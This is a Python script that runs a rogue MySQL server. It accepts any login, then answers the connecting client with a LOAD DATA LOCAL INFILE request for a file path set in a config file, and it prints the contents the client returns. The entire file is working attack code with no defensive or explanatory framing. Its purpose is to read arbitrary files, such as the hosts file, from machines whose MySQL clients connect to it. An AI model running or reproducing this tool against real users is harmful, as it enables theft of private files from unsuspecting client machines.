#!/usr/bin/env python3
# coding: utf-8

import socket
import time
import configparser
import chardet

config = configparser.ConfigParser()
config.read('./conf/config.ini')

filestring = config['DEFAULT']['filestring']


# windows:
# filestring = "C:\\Windows\\system32\\drivers\\etc\\hosts"
HOST = "0.0.0.0" # open for eeeeveryone! ^_^
PORT = 3306
BUFFER_SIZE = 1024

# 1 Greeting
greeting = b"\x5b\x00\x00\x00\x0a\x35\x2e\x36\x2e\x32\x38\x2d\x30\x75\x62\x75\x6e\x74\x75\x30\x2e\x31\x34\x2e\x30\x34\x2e\x31\x00\x2d\x00\x00\x00\x40\x3f\x59\x26\x4b\x2b\x34\x60\x00\xff\xf7\x08\x02\x00\x7f\x80\x15\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x68\x69\x59\x5f\x52\x5f\x63\x55\x60\x64\x53\x52\x00\x6d\x79\x73\x71\x6c\x5f\x6e\x61\x74\x69\x76\x65\x5f\x70\x61\x73\x73\x77\x6f\x72\x64\x00"
# 2 Accept all authentications
authok = b"\x07\x00\x00\x02\x00\x00\x00\x02\x00\x00\x00"

# 3 Payload

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind((HOST, PORT))
s.listen(1)

while True:
    # filestring = input('input ReadFilePath:> ')
    payloadlen = bytes([len(filestring) + 1])
    print(filestring)
    padding = b"\x00\x00\x01\xfb"
    payload = payloadlen + padding + bytes(filestring.encode())
    print('[*] server ready. wait for client...')
    conn, addr = s.accept()

    print('Connection from:', addr)
    conn.send(greeting)
    while True:
        data = conn.recv(BUFFER_SIZE)
        print(" ".join("%02x" % i for i in data))
        conn.send(authok)
        data = conn.recv(BUFFER_SIZE)
        conn.send(payload)
        print("[*] Payload send!")
        data = conn.recv(BUFFER_SIZE)
        if not data:
            break
        # check encode charset for target
        detected_encoding = chardet.detect(data)['encoding']
        content = data.decode(detected_encoding)
        print("Data received:\n", content)
        break
    # Don't leave the connection open.
    conn.close()